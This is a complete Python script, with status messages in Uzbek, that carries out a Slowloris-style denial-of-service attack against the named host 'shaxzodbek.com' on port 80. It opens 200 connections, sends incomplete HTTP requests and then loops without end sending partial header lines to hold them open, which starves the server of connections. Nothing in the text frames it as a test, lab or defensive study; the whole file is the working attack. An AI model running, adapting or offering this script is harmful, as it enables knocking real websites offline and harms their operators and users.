import socket
import time

target_host = "shaxzodbek.com"
target_port = 80
sockets_list = []

print("Ulanishlar boshlanmoqda...")

for _ in range(200):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target_host, target_port))
        s.send(b"GET / HTTP/1.1\r\n")
        sockets_list.append(s)
        print(f"[+] Ulanish {s.getpeername()} ga muvaffaqiyatli amalga oshdi")
    except Exception as e:
        print(f"[-] Ulanish amalga oshmadi: {e}")
        break

while True:
    for s in sockets_list:
        try:
            s.send(b"X-a: b\r\n")
            print(f"[+] Ulanish yangilandi: {s.getpeername()}")
        except:
            print(f"[-] Ulanish uzildi: {s.getpeername()}")
            sockets_list.remove(s)
    time.sleep(1)

